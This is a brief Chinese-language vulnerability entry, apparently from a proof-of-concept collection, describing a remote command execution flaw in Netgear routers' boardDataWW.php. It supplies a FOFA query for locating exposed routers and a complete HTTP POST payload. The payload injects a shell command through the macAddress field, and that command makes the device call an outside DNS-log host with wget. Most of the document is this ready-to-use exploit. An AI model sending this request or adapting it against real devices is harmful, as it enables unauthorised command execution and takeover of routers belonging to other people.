## Netgear路由器boardDataWW.php存在RCE漏洞

NetGear是一家知名的网络设备制造商，其路由器产品线多样化，性能稳定，易用性强，安全性高，并提供良好的技术支持和售后服务。适合家庭和企业用户使用，是可靠的网络设备品牌选择。
该产品boardDataWW.php处存在RCE漏洞，恶意攻击者可能会利用此漏洞执行恶意命令，最终导致服务器失陷。

## fofa
```
title=="Netgear"
```


## poc
```
POST /boardDataWW.php HTTP/1.1
Host: 
Accept: */*
Content-Type: application/x-www-form-urlencoded

macAddress=112233445566%3Bwget+http%3A%2F%2Fnstucl.dnslog.cn%23&reginfo=0&writeData=Submit
```
